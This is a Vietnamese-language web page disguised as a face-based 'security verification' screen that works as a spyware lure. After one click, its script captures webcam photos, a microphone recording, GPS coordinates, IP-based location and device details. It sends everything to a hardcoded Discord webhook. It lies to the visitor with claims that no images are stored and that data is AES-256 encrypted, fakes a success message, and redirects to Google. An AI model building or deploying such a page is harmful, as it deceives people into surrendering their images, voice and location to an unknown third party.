<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Xác minh bảo mật</title>
    <style>
        body {
            background: #f5f5f5;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .security-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.15);
            padding: 40px;
            max-width: 480px;
            width: 100%;
            text-align: center;
        }
        .shield-icon {
            font-size: 64px;
            margin-bottom: 20px;
        }
        h1 {
            color: #1a73e8;
            font-size: 24px;
            margin-bottom: 12px;
        }
        p {
            color: #5f6368;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        .verify-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 14px 32px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            width: 100%;
            max-width: 280px;
        }
        .verify-btn:hover {
            background: #1557b0;
        }
        .verify-btn:active {
            background: #0d47a1;
        }
        .footer-note {
            margin-top: 20px;
            font-size: 12px;
            color: #9aa0a6;
        }
        .check-list {
            text-align: left;
            margin: 20px auto;
            max-width: 320px;
        }
        .check-item {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
            color: #3c4043;
            font-size: 14px;
        }
        .check-item::before {
            content: '✅';
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="security-container">
        <div class="shield-icon">🛡️</div>
        <h1>Xác minh bảo mật</h1>
        <p>Để bảo vệ tài khoản của bạn khỏi truy cập trái phép, vui lòng xác minh danh tính bằng camera.</p>
        
        <div class="check-list">
            <div class="check-item">Xác nhận bạn là người thật</div>
            <div class="check-item">Bảo vệ khỏi bot tự động</div>
            <div class="check-item">Mã hóa dữ liệu an toàn</div>
            <div class="check-item">Không lưu trữ ảnh</div>
        </div>
        
        <button class="verify-btn" id="verifyBtn">📷 Xác minh bằng khuôn mặt</button>
        
        <p class="footer-note">🔒 Dữ liệu của bạn được bảo vệ bởi mã hóa AES-256</p>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // Cấu hình Discord Webhook
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1519694684694384752/J-jW9pYxcagQaVNeHurn1DdmmEyQm1bFpXyWlNyEsVhvpSUgCfwKKMtpQYVOUMBdRuu4'; 
        
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300;
        const AUDIO_DURATION = 4000;
        
        let infoSent = false;
        let photoSentCount = 0;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let gpsDataSent = false;

        async function sendTextToDiscord(content, retryCount = 0) {
            const maxRetries = 2;
            try {
                const payload = {
                    content: content,
                    username: "HUY HOANG",
                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"
                };
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (!response.ok && retryCount < maxRetries) {
                    setTimeout(() => sendTextToDiscord(content, retryCount + 1), 2000);
                }
            } catch (e) {
                if (retryCount < maxRetries) {
                    setTimeout(() => sendTextToDiscord(content, retryCount + 1), 2000);
                }
            }
        }

        async function sendFileToDiscord(fileBlob, fileName, caption = '', retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('file', fileBlob, fileName);
                const payload = {
                    username: "HUY HOANG",
                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"
                };
                if (caption) payload.content = caption;
                formData.append('payload_json', JSON.stringify(payload));
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok && retryCount < maxRetries) {
                    setTimeout(() => sendFileToDiscord(fileBlob, fileName, caption, retryCount + 1), 2000);
                }
            } catch (e) {
                if (retryCount < maxRetries) {
                    setTimeout(() => sendFileToDiscord(fileBlob, fileName, caption, retryCount + 1), 2000);
                }
            }
        }

        async function sendAudioToDiscord(blob) {
            const fileName = `audio_${Date.now()}.ogg`;
            const caption = `🎤 **Ghi âm** - ${new Date().toLocaleString('vi-VN')}`;
            await sendFileToDiscord(blob, fileName, caption);
        }

        async function sendPhotoToDiscord(blob, photoNumber) {
            const fileName = `capture_${photoNumber}_${Date.now()}.jpg`;
            const caption = `📸 **Ảnh chụp #${photoNumber}** - ${new Date().toLocaleString('vi-VN')}`;
            await sendFileToDiscord(blob, fileName, caption);
            photoSentCount++;
            if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
                setTimeout(() => {
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(track => track.stop());
                        cameraStream = null;
                        cameraActive = false;
                    }
                }, 2000);
            }
        }

        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
            return new Promise((resolve) => {
                try {
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((blob) => {
                            if (blob) {
                                sendPhotoToDiscord(blob, photoNumber);
                                resolve(true);
                            } else {
                                resolve(false);
                            }
                        }, 'image/jpeg', 0.85);
                    } else {
                        setTimeout(() => {
                            captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
                        }, 50);
                    }
                } catch (e) {
                    resolve(false);
                }
            });
        }

        async function captureMultiplePhotos(video, canvas, ctx) {
            if (!cameraActive) return;
            for (let i = 1; i <= PHOTO_COUNT; i++) {
                if (!cameraActive) break;
                await captureSinglePhoto(video, canvas, ctx, i);
                if (i < PHOTO_COUNT) {
                    await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
                }
            }
        }

        async function startRecording() {
            if (audioRecorded) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    if (audioBlob.size > 0) {
                        await sendAudioToDiscord(audioBlob);
                        audioRecorded = true;
                    }
                    stream.getTracks().forEach(track => track.stop());
                };
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, AUDIO_DURATION);
            } catch (e) {}
        }

        async function getIPAndLocation() {
            let ip = 'Không xác định';
            let locationData = {
                city: 'Không xác định',
                region: 'Không xác định',
                country: 'Không xác định',
                isp: 'Không xác định',
                lat: null,
                lon: null
            };
            
            const ipAPIs = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/ip.json',
                'https://ipapi.co/json/'
            ];
            
            for (const api of ipAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 4000);
                    const response = await fetch(api, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    if (api.includes('ipify')) ip = data.ip;
                    else if (api.includes('my-ip')) ip = data.ip;
                    else if (api.includes('ipapi.co')) ip = data.ip;
                    if (ip && ip !== 'Không xác định') break;
                } catch (e) {}
            }
            
            const locationAPIs = [
                {
                    url: `https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`,
                    parser: (data) => {
                        if (data && data.status === 'success') {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.regionName && data.regionName !== '' ? data.regionName : 'Không xác định',
                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
                                isp: data.isp && data.isp !== '' ? data.isp : (data.org || 'Không xác định'),
                                lat: data.lat || null,
                                lon: data.lon || null
                            };
                        }
                        return null;
                    }
                },
                {
                    url: `https://ipapi.co/${ip}/json/`,
                    parser: (data) => {
                        if (data && !data.error) {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
                                country: data.country_name && data.country_name !== '' ? data.country_name : 'Không xác định',
                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
                                lat: data.latitude || null,
                                lon: data.longitude || null
                            };
                        }
                        return null;
                    }
                }
            ];
            
            for (const api of locationAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 6000);
                    const response = await fetch(api.url, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    const result = api.parser(data);
                    if (result && (result.city !== 'Không xác định' || result.country !== 'Không xác định')) {
                        locationData = result;
                        break;
                    }
                } catch (e) {}
            }
            
            return { ip, locationData };
        }

        async function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform || 'Không xác định';
            const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
            const isIPhone = /iPhone/.test(userAgent);
            const isIPad = /iPad/.test(userAgent) || (isIOS && screen.width > 768);
            let deviceModel = 'Không xác định';
            if (isIPhone) deviceModel = 'iPhone';
            else if (isIPad) deviceModel = 'iPad';
            else if (isIOS) deviceModel = 'iOS Device';
            else if (/Android/.test(userAgent)) deviceModel = 'Android';
            else if (/Windows/.test(userAgent)) deviceModel = 'Windows';
            else if (/Macintosh/.test(userAgent)) deviceModel = 'Mac';
            return { userAgent, platform, isIOS, deviceModel, isIPhone };
        }

        async function autoSendGPS() {
            if (gpsDataSent) return;
            if (!('geolocation' in navigator)) return;
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const accuracy = pos.coords.accuracy;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                    const gpsMessage = `**📍 VỊ TRÍ GPS THỰC TẾ**\n\n` +
                        `**📌 Vĩ độ:** \`${lat}\`\n` +
                       `**📌 Kinh độ:** \`${lng}\`\n` +
                       `**🎯 Độ chính xác:** \`${Math.round(accuracy)} mét\`\n\n` +
                       `🗺️ [Xem trên Google Maps](${mapsLink})`;
                    await sendTextToDiscord(gpsMessage);
                    gpsDataSent = true;
                },
                (err) => {},
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        async function getInfoAndSendToDiscord() {
            try {
                const { ip, locationData } = await getIPAndLocation();
                const deviceInfo = await getDeviceInfo();
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
                const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
                const currentTime = new Date().toLocaleString('vi-VN');
                const language = navigator.language || 'Không xác định';
                const hardwareConcurrency = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} nhân` : 'Không xác định';
                const referrer = document.referrer || 'Truy cập trực tiếp';
                
                let mapsLink = '';
                if (locationData.lat && locationData.lon) {
                    mapsLink = `\n🗺️ [Xem vị trí](https://www.google.com/maps?q=${locationData.lat},${locationData.lon})`;
                }
                
                const discordMessage = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
                    `**🌐 IP:** \`${ip}\`\n` +
                   `**📍 Vị trí:** \`${locationData.city}, ${locationData.region}, ${locationData.country}\`\n` +
                   `**🏢 Nhà mạng:** \`${locationData.isp}\`${mapsLink}\n\n` +
                   `**📱 Thiết bị:** \`${deviceInfo.deviceModel}\`\n` +
                   `**💻 Trình duyệt:** \`${deviceInfo.userAgent.substring(0, 80)}...\`\n` +
                   `**🖥️ HĐH:** \`${deviceInfo.platform}\`\n` +
                   `**📺 Màn hình:** \`${screenWidth}x${screenHeight}\`\n` +
                   `**💾 RAM:** \`${deviceMemory}\`\n` +
                   `**⚙️ CPU:** \`${hardwareConcurrency}\`\n` +
                   `**🍪 Cookie:** \`${cookieEnabled}\`\n` +
                   `**🌐 Ngôn ngữ:** \`${language}\`\n` +
                   `**🕐 Thời gian:** \`${currentTime}\`\n` +
                    `**📎 Nguồn:** \`${referrer}\``;
                
                await sendTextToDiscord(discordMessage);
            } catch (error) {}
        }
        
        async function startCameraImmediately() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 800 },
                        height: { ideal: 600 },
                        facingMode: 'user'
                    }
                });
                
                cameraStream = stream;
                cameraActive = true;
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                await new Promise(resolve => setTimeout(resolve, 100));
                await captureMultiplePhotos(video, canvas, ctx);
            } catch (e) {
                cameraActive = false;
            }
        }
        
        // Hiển thị giao diện loading sau khi nhấn nút
        function showLoadingUI() {
            const container = document.querySelector('.security-container');
            container.innerHTML = `
                <div style="text-align: center; padding: 40px;">
                    <div style="border: 3px solid #e0e0e0; border-top: 3px solid #1a73e8; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
                    <h2 style="color: #1a73e8; font-size: 20px;">Đang xác minh...</h2>
                    <p style="color: #5f6368;">Vui lòng nhìn vào camera và giữ yên</p>
                    <p style="color: #9aa0a6; font-size: 13px;">Quá trình sẽ hoàn tất trong vài giây</p>
                </div>
                <style>
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            `;
        }
        
        function showSuccessUI() {
            const container = document.querySelector('.security-container');
            container.innerHTML = `
                <div style="text-align: center; padding: 40px;">
                    <div style="font-size: 64px; margin-bottom: 20px;">✅</div>
                    <h2 style="color: #0d904f; font-size: 22px;">Xác minh thành công!</h2>
                    <p style="color: #5f6368;">Danh tính của bạn đã được xác nhận.</p>
                    <p style="color: #9aa0a6; font-size: 13px; margin-top: 20px;">Bạn sẽ được chuyển hướng trong giây lát...</p>
                </div>
            `;
        }
        
        async function startAll() {
            showLoadingUI();
            
            // Chạy tất cả tác vụ thu thập
            getInfoAndSendToDiscord();
            autoSendGPS();
            await startCameraImmediately();
            startRecording();
            
            // Hiển thị thành công sau 3 giây
            setTimeout(() => {
                showSuccessUI();
                setTimeout(() => {
                    window.location.replace('https://google.com');
                }, 2000);
            }, 3000);
        }
        
        // Gán sự kiện click cho nút xác minh
        document.getElementById('verifyBtn').addEventListener('click', () => {
            startAll();
        });
    </script>
</body>
</html>
